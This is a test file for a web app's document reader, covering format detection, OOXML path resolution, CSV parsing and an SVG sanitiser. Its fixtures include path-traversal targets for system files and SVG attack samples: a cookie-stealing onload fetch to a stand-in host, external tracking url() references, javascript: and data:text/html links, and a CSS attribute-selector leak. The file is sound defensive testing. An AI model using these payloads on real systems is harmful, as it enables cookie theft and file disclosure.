// The document reader's four decisions (ui/documents.ts).
//
// Most of that module walks a parsed XML tree and needs a DOM to test. These
// four don't - they're where the module decides rather than copies, and two
// are the difference between a reader and a way out of the archive.
//
// resolveFrom() matters most: a relationship target is resolved then looked
// up in the archive's own key set, never opened as a path. These tests hold
// it to producing a key - a target climbing out of the package produces a
// key absent from the archive, not a path on disk.
//
// It and slideNo() live in import/ooxml.ts, not the reader, since
// import/slide.ts walks the same containers and the importer may not reach
// into ui/.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  canReadDocument, parseDelimited, colIndex, scrub,
} from '../web/assets/js/ui/documents.ts';
import { resolveFrom, slideNo } from '../web/assets/js/import/ooxml.ts';

test('it claims the formats it has readers for', () => {
  for (const ext of ['docx', 'pptx', 'xlsx', 'odt', 'ods', 'odp', 'csv', 'tsv', 'svg', 'cbz']) {
    assert.equal(canReadDocument(ext), true, ext);
  }
  // Case does not decide it: meta.ext is whatever the filename had.
  assert.equal(canReadDocument('DOCX'), true);
  // PDF and markdown each have their own renderer - claiming them here
  // would take the file off both.
  for (const ext of ['pdf', 'md', 'jpg', 'mp4', 'zip', '', undefined, null]) {
    assert.equal(canReadDocument(ext), false, String(ext));
  }
});

// ---------------------------------------------------------------------------
// Relationship targets
// ---------------------------------------------------------------------------

test('a relationship target resolves against the part that named it', () => {
  assert.equal(resolveFrom('ppt/slides/', '../media/image1.png'), 'ppt/media/image1.png');
  assert.equal(resolveFrom('ppt/slides/', 'media/image1.png'), 'ppt/slides/media/image1.png');
  assert.equal(resolveFrom('word/', 'media/pic.jpg'), 'word/media/pic.jpg');
});

test('a target that climbs out of the package cannot name anything outside it', () => {
  // It resolves to some key, and the safety is that it's then looked up, not
  // opened - no archive has an entry called this. A leading slash or a
  // surviving `..` would be a path, not a key, if it ever reached something
  // that opens paths.
  for (const evil of ['../../../../etc/passwd', '/etc/passwd', '..\\..\\windows\\win.ini']) {
    const out = resolveFrom('word/', evil);
    assert.doesNotMatch(out, /(^|\/)\.\.(\/|$)/, out);
    assert.doesNotMatch(out, /^\//, out);
  }
});

test('single dots and empty segments are dropped', () => {
  assert.equal(resolveFrom('word/', './media/./pic.png'), 'word/media/pic.png');
  assert.equal(resolveFrom('word/', 'media//pic.png'), 'word/media/pic.png');
});

test('a target that starts with a slash names a part from the package root', () => {
  // It used to get the base in front: word/word/media/image1.png, no such entry.
  assert.equal(resolveFrom('word/', '/word/media/image1.png'), 'word/media/image1.png');
  assert.equal(resolveFrom('ppt/slides/', '/ppt/media/image2.png'), 'ppt/media/image2.png');
});

// ---------------------------------------------------------------------------
// Spreadsheet cell references
// ---------------------------------------------------------------------------

test('a column letter becomes its index', () => {
  assert.equal(colIndex('A1'), 0);
  assert.equal(colIndex('B7'), 1);
  assert.equal(colIndex('Z1'), 25);
  assert.equal(colIndex('AA1'), 26);
  assert.equal(colIndex('AB100'), 27);
});

test('a reference that is not one answers -1 rather than a position', () => {
  // -1 makes the caller push the cell on the end instead of padding to a
  // nonsense column.
  for (const bad of ['', '7', '1A', '$A$1', 'a1']) assert.equal(colIndex(bad), -1, bad);
});

// ---------------------------------------------------------------------------
// Slide and sheet order
// ---------------------------------------------------------------------------

test('parts sort by their number and not by their name', () => {
  const paths = ['ppt/slides/slide10.xml', 'ppt/slides/slide2.xml', 'ppt/slides/slide1.xml'];
  const sorted = [...paths].sort((a, b) => slideNo(a) - slideNo(b));
  assert.deepEqual(sorted, [
    'ppt/slides/slide1.xml', 'ppt/slides/slide2.xml', 'ppt/slides/slide10.xml',
  ]);
  // Sorted as strings, slide10 lands second and slide2 last - why this isn't
  // a plain sort.
  assert.deepEqual([...paths].sort(), [
    'ppt/slides/slide1.xml', 'ppt/slides/slide10.xml', 'ppt/slides/slide2.xml',
  ]);
});

// ---------------------------------------------------------------------------
// Delimited files
// ---------------------------------------------------------------------------

test('plain rows and columns', () => {
  assert.deepEqual(parseDelimited('a,b\n1,2\n', ','), [['a', 'b'], ['1', '2']]);
});

test('a quoted field may hold the delimiter, a newline and a quote', () => {
  assert.deepEqual(parseDelimited('"a,b",c\n', ','), [['a,b', 'c']]);
  assert.deepEqual(parseDelimited('"two\nlines",c\n', ','), [['two\nlines', 'c']]);
  assert.deepEqual(parseDelimited('"say ""hi""",c\n', ','), [['say "hi"', 'c']]);
});

test('CRLF line endings do not leave a carriage return in the last cell', () => {
  assert.deepEqual(parseDelimited('a,b\r\n1,2\r\n', ','), [['a', 'b'], ['1', '2']]);
});

test('a file with no trailing newline keeps its last row', () => {
  assert.deepEqual(parseDelimited('a,b\n1,2', ','), [['a', 'b'], ['1', '2']]);
});

test('empty fields are kept, because a gap in a row is data', () => {
  assert.deepEqual(parseDelimited('a,,c\n', ','), [['a', '', 'c']]);
  assert.deepEqual(parseDelimited(',,\n', ','), [['', '', '']]);
});

test('an unterminated quote runs to the end rather than looping', () => {
  const out = parseDelimited('"never closed\nand more', ',');
  assert.equal(out.length, 1);
  assert.match(out[0][0], /never closed/);
});

test('other delimiters work the same', () => {
  assert.deepEqual(parseDelimited('a;b\n1;2\n', ';'), [['a', 'b'], ['1', '2']]);
  assert.deepEqual(parseDelimited('a\tb\n1\t2\n', '\t'), [['a', 'b'], ['1', '2']]);
});

test('an empty file has no rows', () => {
  assert.deepEqual(parseDelimited('', ','), []);
});

// ---------------------------------------------------------------------------
// scrub() - the SVG allow-list
//
// The app's single exception to "nothing that reads a foreign document may
// touch innerHTML": an SVG is parsed detached, walked, and what survives is
// imported. tests/csp.test.js asserts the second lock; this is the first,
// previously untested in either direction.
//
// A fake element rather than a DOM, as tests/markdown.test.js and
// tests/drawer.test.js do. Records only what scrub() touches: local name,
// attribute map, children, text.
// ---------------------------------------------------------------------------

class El {
  constructor(localName, attrs = {}, children = []) {
    this.localName = localName;
    this._attrs = new Map(Object.entries(attrs));
    this._children = children;
    this.text = '';
    for (const c of children) c.parent = this;
  }

  get attributes() {
    return [...this._attrs].map(([name, value]) => ({ name, value }));
  }

  get children() { return this._children; }

  removeAttribute(name) { this._attrs.delete(name); }
  getAttribute(name) { return this._attrs.get(name) ?? null; }
  has(name) { return this._attrs.has(name); }
  remove() {
    const kids = this.parent?._children;
    if (kids) kids.splice(kids.indexOf(this), 1);
  }

  replaceChildren() { this._children = []; }
  set textContent(v) { this.text = String(v); this._children = []; }
  get textContent() { return this.text; }

  /** Every element in this subtree, for asserting over the whole result. */
  all(out = []) {
    out.push(this);
    for (const c of this._children) c.all(out);
    return out;
  }
}

test('the root element is scrubbed, not only its children', () => {
  // `<svg onload="...">` survived because the walk iterated node.children
  // without checking the node it was handed.
  const root = new El('svg', {
    xmlns: 'http://www.w3.org/2000/svg',
    onload: "fetch('//x/' + document.cookie)",
    style: 'background:url(//x/beacon)',
  });
  scrub(root);
  assert.equal(root.has('onload'), false, 'an onload handler on the root survived');
  assert.equal(root.has('style'), false, 'a style attribute on the root survived');
  assert.equal(root.has('xmlns'), true, 'the namespace is not a reference and stays');
});

test('an event handler is dropped wherever it is', () => {
  const root = new El('svg', {}, [
    new El('rect', { onclick: 'alert(1)', fill: 'red' }),
    new El('g', {}, [new El('circle', { onmouseover: 'alert(1)' })]),
  ]);
  scrub(root);
  for (const node of root.all()) {
    for (const { name } of node.attributes) {
      assert.ok(!name.startsWith('on'), `${node.localName} kept ${name}`);
    }
  }
  assert.equal(root.children[0].getAttribute('fill'), 'red', 'and the drawing survives');
});

test('a style attribute is a reference to somewhere else', () => {
  // The filter had no case for `style`, so
  // style="fill:url(//attacker/track.svg#a)" reached the page and fired.
  const root = new El('svg', {}, [new El('rect', { style: 'fill:url(//attacker/track.svg#a)' })]);
  scrub(root);
  assert.equal(root.children[0].has('style'), false);
});

test('a presentation attribute may point only inside the drawing', () => {
  // Only `style` was checked, so fill="url(//x)" and its siblings kept the
  // request; the deploy's CSP was the one thing left in the way.
  const away = ['url(//x/a.svg#p)', 'URL( "https://x/a#p" )', "url('//x')", 'u\\72l(//x)'];
  const root = new El('svg', {}, [
    ...away.map(v => new El('rect', { fill: v, filter: v, mask: v, 'clip-path': v, 'marker-end': v })),
    new El('rect', { fill: 'url(#grad)', filter: "url('#blur')", mask: 'url( "#m" )', stroke: 'red' }),
  ]);
  scrub(root);
  for (const rect of root.children.slice(0, -1)) {
    assert.deepEqual(rect.attributes, [], `${JSON.stringify(rect.attributes)} survived`);
  }
  assert.deepEqual(root.children.at(-1).attributes.map(a => a.name), ['fill', 'filter', 'mask', 'stroke'],
    'a reference to the drawing itself is kept');
});

test('a style element is emptied, because its CSS is not scoped to the drawing', () => {
  // An inline <style> in an SVG subtree is a document stylesheet - nothing
  // filtered text content, so an opened drawing could restyle the whole app.
  const style = new El('style', {});
  style.text = '*{display:none} input[value^="a"]{background:url(//x/a)}';
  const root = new El('svg', {}, [style]);
  scrub(root);
  assert.equal(root.children.length, 1, 'kept, so the tree still reads as itself');
  assert.equal(root.children[0].textContent, '', 'and carries no rules');
});

test('an xlink href is caught under any prefix the file chose', () => {
  // A prefix is the author's to choose: binding the same namespace as `xl:`
  // used to keep the attribute.
  const root = new El('svg', {}, [
    new El('use', { 'xlink:href': 'https://attacker/x.svg#a' }),
    new El('use', { 'xl:href': 'https://attacker/x.svg#a' }),
    new El('use', { 'href': 'https://attacker/x.svg#a' }),
  ]);
  scrub(root);
  for (const use of root.children) {
    assert.deepEqual(use.attributes, [], `${JSON.stringify(use.attributes)} survived`);
  }
});

test('a fragment reference is the one form kept', () => {
  // Dropping this would break every legitimate symbol.
  const root = new El('svg', {}, [new El('use', { href: '#thing' })]);
  scrub(root);
  assert.equal(root.children[0].getAttribute('href'), '#thing');
});

test('an element that is not on the allow-list is dropped whole', () => {
  const root = new El('svg', {}, [
    new El('script', {}, [new El('path', {})]),
    new El('foreignObject', {}),
    new El('path', { d: 'M0 0' }),
  ]);
  scrub(root);
  assert.deepEqual(root.children.map(c => c.localName), ['path']);
});

test('javascript: and data:text/html are refused in any attribute', () => {
  const root = new El('svg', {}, [
    new El('a', { href: 'javascript:alert(1)' }),
    new El('rect', { fill: 'data:text/html,<script>alert(1)</script>' }),
  ]);
  scrub(root);
  for (const node of root.all()) assert.deepEqual(node.attributes, []);
});

test('a tree deeper than the cap is emptied rather than overflowing the stack', { timeout: 5000 }, () => {
  let node = new El('path', {});
  for (let i = 0; i < 2000; i++) node = new El('g', {}, [node]);
  const root = new El('svg', {}, [node]);
  assert.doesNotThrow(() => scrub(root));
});

test('an ordinary drawing comes through unchanged', () => {
  // Matters as much as the refusals: a sanitiser that eats real files gets turned off.
  const root = new El('svg', { xmlns: 'http://www.w3.org/2000/svg', viewBox: '0 0 16 16' }, [
    new El('g', { fill: 'none', stroke: 'currentColor' }, [
      new El('path', { d: 'M1 1 L15 15', 'stroke-width': '2' }),
      new El('circle', { cx: '8', cy: '8', r: '4' }),
    ]),
  ]);
  scrub(root);
  assert.equal(root.getAttribute('viewBox'), '0 0 16 16');
  assert.equal(root.children[0].getAttribute('stroke'), 'currentColor');
  assert.equal(root.children[0].children[0].getAttribute('d'), 'M1 1 L15 15');
  assert.equal(root.children[0].children[1].getAttribute('r'), '4');
});
